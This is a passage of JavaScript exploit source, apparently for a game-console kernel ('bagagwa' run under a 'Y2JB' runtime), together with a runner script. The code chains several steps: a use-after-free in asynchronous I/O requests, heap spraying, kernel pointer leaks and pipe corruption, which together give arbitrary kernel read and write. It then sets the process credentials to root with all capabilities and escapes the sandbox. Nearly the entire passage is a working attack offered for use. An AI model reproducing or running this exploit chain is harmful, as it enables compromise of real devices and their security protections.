        flushMark("BAGAGWA-STAGE0-DONE", "numRequests=" + numRequests +
            "-uafTriggered=1-danglingReqIdx=0");
        note("UAF triggered: waiter array freed, request 0 holds dangling pointer");
        return out;
    }

    async function stage1_spray(opts) {
        const o = opts || {};
        const out = { ok: false, why: "", steps: [] };

        note("=== Stage 1: osem object spray into 128-byte zone ===");

        if (!S.uafTriggered) {
            out.why = "stage 0 UAF not triggered";
            return out;
        }

        const osemStubs = [
            [SYS_OSEM_CREATE, "osem_create"],
            [SYS_OSEM_OPEN, "osem_open"],
            [SYS_OSEM_CLOSE, "osem_close"],
            [SYS_OSEM_DELETE, "osem_delete"],
        ];
        const missing = osemStubs.filter(([num]) => P.syscalls[num] === undefined);
        if (missing.length) {
            out.why = "missing osem stubs: " + missing.map(([n, l]) =>
                "0x" + n.toString(16) + " (" + l + ")").join(", ");
            return out;
        }

        const count = o.sprayCount || OSEM_SPRAY_COUNT;
        const sr = await sprayOsem(count, o.batchSize);
        out.steps.push("sprayed " + sr.count + " osem objects");

        if (!sr.ok) {
            out.why = "osem spray failed";
            return out;
        }

        for (let i = 0; i < sr.count && i < 4; i++) {
            const r = await sys(SYS_OSEM_OPEN, sr.handles[i]);
            if (!r.failed) {
                out.steps.push("osem_open(" + sr.handles[i] + ") refcount incremented");
            }
        }

        out.ok = true;
        flushMark("BAGAGWA-STAGE1-DONE", "osemCount=" + sr.count);
        note("osem objects sprayed into 128-byte zone, should reclaim freed waiter array");
        return out;
    }

    async function stage2_leak(opts) {
        const o = opts || {};
        const out = { ok: false, why: "", steps: [], leaked: [] };

        note("=== Stage 2: kernel address leak ===");

        if (P.syscalls[SYS_GET_AIO_DEBUG_REQ_INFO] !== undefined) {
            note("syscall 727 (0x2D7) stub available — get_aio_debug_request_info @ 0x805c3090");
            note("OOB: source idx = (req_id>>16)+edx scaled by 0x28 into [rax+0x20]");
            for (let tIdx = 0; tIdx < LEAK_ATTEMPTS; tIdx++) {
                for (let i = 0; i < S.aioRequests.length; i++) {
                    const lr = await leakViaDebugInfo(S.aioRequests[i].id, tIdx);
                    if (lr.ok) {
                        out.leaked = out.leaked.concat(lr.leaked);
                        for (const l of lr.leaked) {
                            if (l.value) {
                                out.steps.push("leaked ptr at tIdx=" + tIdx +
                                    " off=0x" + l.offset.toString(16) +
                                    ": " + hx(l.value));
                                if (!S.targetOsemAddr && isKernelPtr(l.value) &&
                                    isAligned8(l.value)) {
                                    S.targetOsemAddr = l.value;
                                    out.steps.push("candidate osem object addr: " + hx(l.value));
                                }
                            }
                        }
                    }
                }
            }
            if (S.targetOsemAddr) {
                note("leaked candidate osem addr = " + hx(S.targetOsemAddr) +
                    " (refcount at +" + OSEM_REFCOUNT_OFF.toString(16) + " = " +
                    hx(S.targetOsemAddr.add32(OSEM_REFCOUNT_OFF)) + ")");
            }
        } else {
            note("syscall 727 (0x2D7) not in firmware profile — using pipe-based leak path");
        }

        const pr = await setupPipes();
        if (!pr.ok) { out.why = pr.why; return out; }
        out.steps.push("pipes created for kernel R/W");

        out.ok = true;
        flushMark("BAGAGWA-STAGE2-DONE", "leakedPtrs=" + out.leaked.length +
            "-targetOsem=" + hx(S.targetOsemAddr));
        return out;
    }

    async function stage3_refcount(opts) {
        const o = opts || {};
        const out = { ok: false, why: "", steps: [] };

        note("=== Stage 3: osem refcount manipulation via waker + osem_close ===");

        if (!S.uafTriggered) {
            out.why = "UAF not triggered";
            return out;
        }

        const wr = await triggerWaker(S.uafRequestIdx);
        if (wr.ok) {
            out.steps.push("waker triggered via aioWfd write: ret=" + wr.writeRet);
            out.steps.push("waker fires on dangling node (=reclaimed osem): " +
                "dec [osem+0x00]→ptr, write [osem+0x20], mtx_lock [osem+0x10]+0x18");
        } else {
            out.steps.push("waker trigger failed: " + wr.why + " — using osem_close path");
        }

        await sleep(100);

        let freedIdx = -1;
        for (let i = 0; i < S.osemHandles.length; i++) {
            const r = await sys(SYS_OSEM_POST, S.osemHandles[i]);
            if (r.failed) {
                freedIdx = i;
                out.steps.push("osem[" + i + "] (handle=" + S.osemHandles[i] +
                    ") already freed by waker's dec dword [rax] primitive");
                break;
            }
        }

        if (freedIdx < 0) {
            note("waker dec did not free osem directly, using osem_close to drain refcount");
            note("per writeup: osem_close does dec [rbx+0x54] and frees at zero");

            for (let i = 0; i < Math.min(16, S.osemHandles.length); i++) {
                const handle = S.osemHandles[i];
                const cr = await sys(SYS_OSEM_CLOSE, handle);
                if (cr.failed) continue;
                out.steps.push("osem_close(" + handle + ") decremented refcount at +0x54");

                const probe = await sys(SYS_OSEM_POST, handle);
                if (probe.failed) {
                    freedIdx = i;
                    out.steps.push("osem[" + i + "] freed — refcount reached 0 via osem_close");
                    break;
                }
            }
        }

        if (freedIdx < 0) {
            note("osem_close did not free, trying osem_delete (flag check at +0x45)");
            for (let i = 0; i < Math.min(8, S.osemHandles.length); i++) {
                const handle = S.osemHandles[i];
                const dr = await sys(SYS_OSEM_DELETE, handle);
                if (!dr.failed) {
                    freedIdx = i;
                    out.steps.push("osem[" + i + "] deleted via osem_delete " +
                        "(flag at +0x45 clear → skip refcount, straight to free)");
                    break;
                }
            }
        }

        if (freedIdx >= 0) {
            S.targetOsemIdx = freedIdx;
            out.ok = true;
            note("osem object freed at index " + freedIdx +
                " — 128-byte slab available for reclaim");
        } else {
            out.why = "could not free any osem object via refcount manipulation";
        }

        flushMark("BAGAGWA-STAGE3-DONE", "freedIdx=" + freedIdx);
        return out;
    }

    async function stage4_reclaim(opts) {
        const o = opts || {};
        const out = { ok: false, why: "", steps: [], rw: false };

        note("=== Stage 4: reclaim freed osem + establish kernel R/W ===");

        if (S.targetOsemIdx < 0 && !o.force) {
            out.why = "no freed osem object to reclaim";
            return out;
        }

        const kqBuf = alloc(4, "kqueue-fd");
        const kqFds = [];
        const KQ_SPRAY = o.kqSpray || 64;

        for (let i = 0; i < KQ_SPRAY; i++) {
            const r = await sys(SYS_KQUEUE);
            if (r.failed) continue;
            kqFds.push(r.s32);
            track(r.s32);
        }
        out.steps.push("sprayed " + kqFds.length + " kqueues for reclaim");

        const probeAddr = alloc(8, "probe-addr");
        for (let i = 0; i < kqFds.length; i++) {
            const fp = await fgetFast(kqFds[i]);
            if (fp.ret === 8 && isKernelPtr(fp.v)) {
                const fdata = await kread64Fast(fp.v.add32(OFF.FILE_F_DATA));
                if (fdata.ret === 8 && isKernelPtr(fdata.v)) {
                    const magic = await kread32Fast(fdata.v.add32(0x08));
                    if (magic.v === 0x1430000) {
                        const fdp = await kread64Fast(fdata.v.add32(0xA8));
                        if (fdp.ret === 8 && isKernelPtr(fdp.v)) {
                            S.fdOfiles = null;
                            const tbl = await kread64Fast(fdp.v.add32(OFF.FILEDESC_OFILES));
                            if (tbl.ret === 8 && isKernelPtr(tbl.v)) {
                                const hdr = await kread64Fast(tbl.v.add32(OFF.FDESCENTTBL_HDR));
                                if (hdr.ret === 8 && isKernelPtr(hdr.v)) {
                                    S.fdOfiles = hdr.v;
                                    out.steps.push("fd_ofiles = " + hx(hdr.v) +
                                        " via kqueue[" + i + "]");
                                }
                            }
                        }
                    }
                }
            }
        }

        if (!S.fdOfiles) {
            note("kqueue reclaim did not yield fd_ofiles, trying pipe-based approach");

            const cp = await findCurproc();
            if (cp.ok) {
                S.curproc = cp.curproc;
                out.steps.push("curproc = " + hx(cp.curproc) + " pid=" + cp.pid);

                const fdR = await kread64Fast(cp.curproc.add32(OFF.PROC_FD));
                if (fdR.ret === 8 && isKernelPtr(fdR.v)) {
                    const tbl = await kread64Fast(fdR.v.add32(OFF.FILEDESC_OFILES));
                    if (tbl.ret === 8 && isKernelPtr(tbl.v)) {
                        const hdr = await kread64Fast(tbl.v.add32(OFF.FDESCENTTBL_HDR));
                        if (hdr.ret === 8 && isKernelPtr(hdr.v)) {
                            S.fdOfiles = hdr.v;
                            out.steps.push("fd_ofiles = " + hx(hdr.v) + " via curproc");
                        }
                    }
                }
            }
        }

        if (S.fdOfiles) {
            const masterFp = await fgetFast(S.masterRfd);
            const victimFp = await fgetFast(S.victimRfd);
            if (isKernelPtr(masterFp.v) && isKernelPtr(victimFp.v)) {
                S.masterFp = masterFp.v;
                S.victimFp = victimFp.v;

                const mData = await kread64Fast(masterFp.v.add32(OFF.FILE_F_DATA));
                const vData = await kread64Fast(victimFp.v.add32(OFF.FILE_F_DATA));
                if (isKernelPtr(mData.v) && isKernelPtr(vData.v)) {
                    S.masterPipeData = mData.v;
                    S.victimPipeData = vData.v;

                    const pb = alloc(PIPEBUF_SIZE, "stage4-pipebuf");
                    w32(pb.u8, 0x00, 0);
                    w32(pb.u8, 0x04, 0);
                    w32(pb.u8, 0x08, 0);
                    w32(pb.u8, 0x0c, PIPE_PAGE_SIZE);
                    w64(pb.u8, 0x10, S.victimPipeData);

                    await kwriteFast(S.masterPipeData, pb, PIPEBUF_SIZE);

                    const verify = await kread64Fast(S.masterPipeData.add32(0x10));
                    if (verify.ret === 8 &&
                        verify.v.low === S.victimPipeData.low &&
                        verify.v.hi === S.victimPipeData.hi) {
                        out.rw = true;
                        out.steps.push("fast kernel R/W established via pipe corruption");
                        out.steps.push("master_pipe = " + hx(S.masterPipeData));
                        out.steps.push("victim_pipe = " + hx(S.victimPipeData));
                    }
                }
            }
        }

        for (const fd of kqFds) {
            await sys(SYS_CLOSE, fd);
            untrack(fd);
        }

        if (out.rw) {
            out.ok = true;
            flushMark("BAGAGWA-STAGE4-DONE", "rw=1-fdOfiles=" + hx(S.fdOfiles) +
                "-masterPipe=" + hx(S.masterPipeData) + "-victimPipe=" + hx(S.victimPipeData));
        } else {
            out.why = "could not establish kernel R/W";
        }
        return out;
    }

    async function stage5_jailbreak(opts) {
        const o = opts || {};
        const out = { ok: false, why: "", steps: [], before: {}, after: {} };

        note("=== Stage 5: privilege escalation & sandbox escape ===");

        if (!S.masterPipeData || !S.victimPipeData) {
            out.why = "need kernel R/W from stage 4";
            return out;
        }

        if (!S.curproc) {
            const cp = await findCurproc();
            if (!cp.ok) { out.why = "curproc: " + cp.why; return out; }
            S.curproc = cp.curproc;
        }
        out.steps.push("curproc = " + hx(S.curproc));

        const ucR = await kread64Fast(S.curproc.add32(OFF.PROC_UCRED));
        if (ucR.ret !== 8 || !isKernelPtr(ucR.v)) {
            out.why = "p_ucred = " + hx(ucR.v);
            return out;
        }
        const ucred = ucR.v;
        out.steps.push("p_ucred = " + hx(ucred));

        const fdR = await kread64Fast(S.curproc.add32(OFF.PROC_FD));
        if (fdR.ret !== 8 || !isKernelPtr(fdR.v)) {
            out.why = "p_fd = " + hx(fdR.v);
            return out;
        }
        const procFd = fdR.v;

        const uid0 = await kread32Fast(ucred.add32(OFF.UCRED_CR_UID));
        out.before.uid = uid0.v;
        out.steps.push("before: cr_uid = " + uid0.v);

        const rv = await findRootvnode();
        if (!rv.ok) { out.why = "rootvnode: " + rv.why; return out; }
        out.steps.push("rootvnode = " + hx(rv.rootvnode));

        flushMark("BAGAGWA-JAILBREAK-PRE", "curproc=" + hx(S.curproc) +
            "-ucred=" + hx(ucred) + "-uid=" + uid0.v);

        await kwrite32Fast(ucred.add32(OFF.UCRED_CR_UID), 0);
        await kwrite32Fast(ucred.add32(OFF.UCRED_CR_RUID), 0);
        await kwrite32Fast(ucred.add32(OFF.UCRED_CR_SVUID), 0);
        await kwrite32Fast(ucred.add32(OFF.UCRED_CR_NGROUPS), 1);
        await kwrite32Fast(ucred.add32(OFF.UCRED_CR_RGID), 0);
        await kwrite32Fast(ucred.add32(OFF.UCRED_CR_SVGID), 0);
        out.steps.push("cr_uid/ruid/svuid = 0, ngroups = 1, rgid/svgid = 0");

        const SYSCORE_AUTHID_LO = 0x3800000000000010 & 0xFFFFFFFF;
        const SYSCORE_AUTHID_HI = (0x3800000000000010 / 0x100000000) >>> 0;
        await kwrite64Fast(ucred.add32(OFF.UCRED_CR_SCEAUTHID),
            i64(SYSCORE_AUTHID_LO, SYSCORE_AUTHID_HI));
        await kwrite64Fast(ucred.add32(OFF.UCRED_CR_SCECAPS0),
            i64(0xFFFFFFFF, 0xFFFFFFFF));
        await kwrite64Fast(ucred.add32(OFF.UCRED_CR_SCECAPS1),
            i64(0xFFFFFFFF, 0xFFFFFFFF));
        out.steps.push("authID = SYSCORE, caps = all");

        const attrs0 = await kread64Fast(ucred.add32(OFF.UCRED_ATTRS_QWORD));
        if (attrs0.ret === 8) {
            const attrs = i64(
                ((attrs0.v.low & 0x00FFFFFF) >>> 0) | 0x80000000,
                attrs0.v.hi
            );
            await kwrite64Fast(ucred.add32(OFF.UCRED_ATTRS_QWORD), attrs);
            out.steps.push("cr_sceAttrs byte = 0x80 (RMW)");
        }

        await kwrite64Fast(procFd.add32(OFF.FD_CDIR), rv.rootvnode);
        await kwrite64Fast(procFd.add32(OFF.FD_RDIR), rv.rootvnode);
        await kwrite64Fast(procFd.add32(OFF.FD_JDIR), i64(0, 0));
        out.steps.push("fd_cdir/fd_rdir = rootvnode, fd_jdir = 0");

        const dl = await kread64Fast(S.curproc.add32(OFF.PROC_DYNLIB));
        if (dl.ret === 8 && isKernelPtr(dl.v)) {
            await kwrite64Fast(dl.v.add32(OFF.DYNLIB_SC_START), i64(0, 0));
            await kwrite64Fast(dl.v.add32(OFF.DYNLIB_SC_END),
                i64(0xFFFFFFFF, 0xFFFFFFFF));
            out.steps.push("syscall range widened");
        }

        const uid1 = await kread32Fast(ucred.add32(OFF.UCRED_CR_UID));
        out.after.uid = uid1.v;

        const gu = await sys(SYS_GETUID);
        out.after.getuid = gu.failed ? -1 : gu.s32;
        out.steps.push("after: cr_uid = " + uid1.v + ", getuid() = " + out.after.getuid);

        if (uid1.v === 0 && out.after.getuid === 0) {
            S.jailbroken = true;
            out.ok = true;
            flushMark("BAGAGWA-JAILBREAK-DONE", "uid=0-getuid=0-kernelWrites=" + S.kernelWrites);
            note("JAILBREAK COMPLETE: uid 0, sandbox escaped, full capabilities");
        } else {
            out.why = "cr_uid=" + uid1.v + " getuid()=" + out.after.getuid;
        }
        return out;
    }

    async function runAll(opts) {
        const o = opts || {};
        const results = { stages: [], ok: false };

        const s0 = await stage0_uaf(o);
        results.stages.push({ name: "stage0_uaf", ...s0 });
        if (!s0.ok) { results.why = "stage 0: " + s0.why; return results; }

        const s1 = await stage1_spray(o);
        results.stages.push({ name: "stage1_spray", ...s1 });
        if (!s1.ok) { results.why = "stage 1: " + s1.why; return results; }

        const s2 = await stage2_leak(o);
        results.stages.push({ name: "stage2_leak", ...s2 });
        if (!s2.ok) { results.why = "stage 2: " + s2.why; return results; }

        const s3 = await stage3_refcount(o);
        results.stages.push({ name: "stage3_refcount", ...s3 });
        if (!s3.ok) { results.why = "stage 3: " + s3.why; return results; }

        const s4 = await stage4_reclaim(o);
        results.stages.push({ name: "stage4_reclaim", ...s4 });
        if (!s4.ok) { results.why = "stage 4: " + s4.why; return results; }

        const s5 = await stage5_jailbreak(o);
        results.stages.push({ name: "stage5_jailbreak", ...s5 });
        if (!s5.ok) { results.why = "stage 5: " + s5.why; return results; }

        results.ok = true;
        return results;
    }

    async function cleanup() {
        const rep = { closed: 0, osemDeleted: 0 };

        for (const h of S.osemHandles) {
            const r = await sys(SYS_OSEM_DELETE, h);
            if (!r.failed) rep.osemDeleted++;
        }

        for (const req of S.aioRequests) {
            await sys(SYS_AIO_MULTI_DELETE, req.instanceId, req.id);
        }

        const pipeFds = [S.aioRfd, S.aioWfd, S.masterRfd, S.masterWfd,
            S.victimRfd, S.victimWfd].filter(fd => fd >= 0);
        for (const fd of pipeFds) {
            await sys(SYS_CLOSE, fd);
            untrack(fd);
            rep.closed++;
        }

        flushMark("BAGAGWA-CLEANUP", "osemDeleted=" + rep.osemDeleted +
            "-fdsClosed=" + rep.closed);
        return rep;
    }

    return {
        S,
        OFF,

        initAio,
        createAioInstance,
        submitAioRequest,
        triggerUaf,
        sprayOsem,
        leakViaDebugInfo,
        triggerWaker,
        manipulateOsemRefcount,
        setupPipes,

        kreadFast,
        kwriteFast,
        kread64Fast,
        kread32Fast,
        kwrite64Fast,
        kwrite32Fast,
        fgetFast,
        findCurproc,
        findProcByPid,
        findAllproc,
        findRootvnode,

        stage0_uaf,
        stage1_spray,
        stage2_leak,
        stage3_refcount,
        stage4_reclaim,
        stage5_jailbreak,
        runAll,
        cleanup,

        get jailbroken() { return S.jailbroken; },
        get kernelWrites() { return S.kernelWrites; },
        get uafTriggered() { return S.uafTriggered; },
    };
}
// ============================================================================
// Replace the old try/catch block at the end of bagagwa.js with this.
// ============================================================================
(function bootstrapBagagwa() {
    "use strict";

    const OUT = (s) => { try { log(s); } catch (e) {} };

    OUT("Globals: " + Object.keys(globalThis).filter(k =>
        !k.startsWith("__") && k.length < 30
    ).join(", "));
    OUT("P=" + typeof P + " p=" + typeof p + " sys=" + typeof sys +
        " syscall=" + typeof syscall + " chain=" + typeof chain +
        " currentChain=" + typeof currentChain + " int64=" + typeof int64 +
        " worker_rop=" + typeof worker_rop + " mem=" + typeof mem +
        " track=" + typeof track + " flushMark=" + typeof flushMark);
})();

// y2jb_run.js -- staged bagagwa runner for the Y2JB remote-JS runtime.
// Concatenated AFTER y2jb_head.js + engine body. Auto-runs on load.
// DRY_RUN=true (default): stages 0-4 + read-only OFF validation, stage 5
// SKIPPED. Set false only after a green validation to actually jailbreak.
(async () => {
    const LOG_HOST = "192.168.0.163"; // <-- your Mac IP
    const DRY_RUN = true;
    const note2 = (s) => { try { log("[bgw-run] " + s); } catch (e) {} };
    const milestone = (s) => { try { send_notification(s); } catch (e) {} };
    try { LOG_SERVER = "http://" + LOG_HOST + ":8080/log"; } catch (e) {}
    try { if (typeof checkLogServer === "function") await checkLogServer(); } catch (e) {}

    function isKPtr(v) {
        return v !== null && v !== undefined && ((v.hi >>> 16) === 0xFFFF);
    }
    function hx(v) {
        if (v === null || v === undefined) return "null";
        return "0x" + (v.hi >>> 0).toString(16) + (v.low >>> 0).toString(16).padStart(8, "0");
    }

    // Read-only OFF gate: runs after stage 4 (kread live), before stage 5.
    // ZERO kernel writes. Fail => stage 5 stays blocked, whatever DRY_RUN is.
    async function y2jb_validate(engine) {
        const checks = [], fail = [];
        const pass = (n, ok, d) => {
            checks.push({ name: n, ok: !!ok, detail: d || "" });
            if (!ok) fail.push(n);
        };
        const OFF = engine.OFF, S = engine.S;
        pass("s4.curproc-set", isKPtr(S.curproc), hx(S.curproc));
        pass("s4.fdOfiles-set", isKPtr(S.fdOfiles), hx(S.fdOfiles));
        pass("s4.pipes-set", isKPtr(S.masterPipeData) && isKPtr(S.victimPipeData),
            hx(S.masterPipeData) + " " + hx(S.victimPipeData));
        if (fail.length) return { ok: false, checks, failed: fail };
        try {
            const cp = await engine.findCurproc();
            pass("proc.pid-getpid", cp.ok, cp.ok ? ("pid=" + cp.pid) : cp.why);
            if (cp.ok) {
                const pid = await engine.kread32Fast(S.curproc.add32(OFF.PROC_PID));
                pass("proc.pid-kread", pid.ret === 4 && pid.v === cp.pid,
                    "ret=" + pid.ret + " kread=" + pid.v + " getpid=" + cp.pid);
            }
        } catch (e) { pass("proc.pid-getpid", false, String((e && e.message) || e)); }
        const uc = await engine.kread64Fast(S.curproc.add32(OFF.PROC_UCRED));
        pass("proc.ucred-ptr", uc.ret === 8 && isKPtr(uc.v), "ret=" + uc.ret + " " + hx(uc.v));
        if (uc.ret === 8 && isKPtr(uc.v)) {
            const u = uc.v;
            const uid = await engine.kread32Fast(u.add32(OFF.UCRED_CR_UID));
            const ng = await engine.kread32Fast(u.add32(OFF.UCRED_CR_NGROUPS));
            pass("ucred.uid", uid.ret === 4 && uid.v >= 0 && uid.v <= 60000, "ret=" + uid.ret + " v=" + uid.v);
            pass("ucred.ngroups", ng.ret === 4 && ng.v >= 0 && ng.v <= 1024, "ret=" + ng.ret + " v=" + ng.v);
        }
        const fd = await engine.kread64Fast(S.curproc.add32(OFF.PROC_FD));
        pass("proc.fd-ptr", fd.ret === 8 && isKPtr(fd.v), "ret=" + fd.ret + " " + hx(fd.v));
        if (fd.ret === 8 && isKPtr(fd.v)) {
            const cd = await engine.kread64Fast(fd.v.add32(OFF.FD_CDIR));
            const rd = await engine.kread64Fast(fd.v.add32(OFF.FD_RDIR));
            pass("fd.cdir", cd.ret === 8 && isKPtr(cd.v), "ret=" + cd.ret + " " + hx(cd.v));
            pass("fd.rdir", rd.ret === 8 && isKPtr(rd.v), "ret=" + rd.ret + " " + hx(rd.v));
        }
        if (S.masterRfd >= 0) {
            const fp = await engine.fgetFast(S.masterRfd);
            pass("fget.master", fp.ret === 8 && isKPtr(fp.v), "ret=" + fp.ret + " " + hx(fp.v));
            if (fp.ret === 8 && isKPtr(fp.v)) {
                const fdata = await engine.kread64Fast(fp.v.add32(OFF.FILE_F_DATA));
                pass("file.f_data", fdata.ret === 8 && isKPtr(fdata.v), "ret=" + fdata.ret + " " + hx(fdata.v));
            }
        }
        for (const c of checks) note2("  " + (c.ok ? "PASS " : "FAIL ") + c.name + " " + c.detail);
        return { ok: fail.length === 0, failed: fail };
    }

    async function runStage(engine, name, fn) {
        note2("--- " + name + " ---");
        const r = await fn();
        for (const s of (r.steps || [])) note2("  " + s);
        if (!r.ok) note2(name + " FAILED: " + r.why);
        else note2(name + " OK");
        return r;
    }

    try {
        milestone("bgw: alive, baseline next");
        note2("alive, calling getpid baseline");
        const pid0 = await syscall(0x14n);
        note2("baseline getpid=" + String(pid0));
        try {
            if (typeof is_jailbroken === "function") note2("baseline is_jailbroken=" + String(await is_jailbroken()));
        } catch (e) { note2("is_jailbroken check skipped"); }

        const ctx = y2jb_make_context();
        const engine = makeBagagwaEngine(ctx);
        milestone("bgw: engine up, stage 0");

        const s0 = await runStage(engine, "stage0_uaf", () => engine.stage0_uaf());
        if (!s0.ok) { milestone("bgw: stage 0 FAILED"); return; }
        const s1 = await runStage(engine, "stage1_spray", () => engine.stage1_spray());
        if (!s1.ok) { milestone("bgw: stage 1 FAILED"); return; }
        const s2 = await runStage(engine, "stage2_leak", () => engine.stage2_leak());
        if (!s2.ok) { milestone("bgw: stage 2 FAILED"); return; }
        const s3 = await runStage(engine, "stage3_refcount", () => engine.stage3_refcount());
        if (!s3.ok) { milestone("bgw: stage 3 FAILED"); return; }
        const s4 = await runStage(engine, "stage4_reclaim", () => engine.stage4_reclaim());
        if (!s4.ok) { milestone("bgw: stage 4 FAILED"); return; }
        milestone("bgw: kernel R/W up, validating OFF");

        note2("--- OFF validation (read-only, gates stage 5) ---");
        const v = await y2jb_validate(engine);
        if (!v.ok) {
            note2("OFF VALIDATION FAILED: " + v.failed.join(","));
            milestone("bgw: OFF mismatch, stage 5 blocked");
            return;
        }
        note2("OFF validation passed");

        if (DRY_RUN) {
            note2("DRY RUN COMPLETE: s0-s4 green, validator green, stage 5 SKIPPED.");
            note2("To jailbreak: set DRY_RUN=false in y2jb_run.js and re-send.");
            milestone("bgw: DRY RUN green, stage 5 skipped");
            return;
        }

        const s5 = await runStage(engine, "stage5_jailbreak", () => engine.stage5_jailbreak());
        if (!s5.ok) { milestone("bgw: stage 5 FAILED"); return; }
        note2("=== JAILBREAK COMPLETE === uid " + s5.before.uid + " -> " + s5.after.uid +
            " getuid()=" + s5.after.getuid + " writes=" + engine.kernelWrites);
        milestone("bgw: JAILBROKEN uid=0");
    } catch (e) {
        note2("FATAL: " + ((e && e.stack) || (e && e.message) || String(e)));
        try { send_notification("bgw: FATAL, see log"); } catch (_) {}
    }
})()
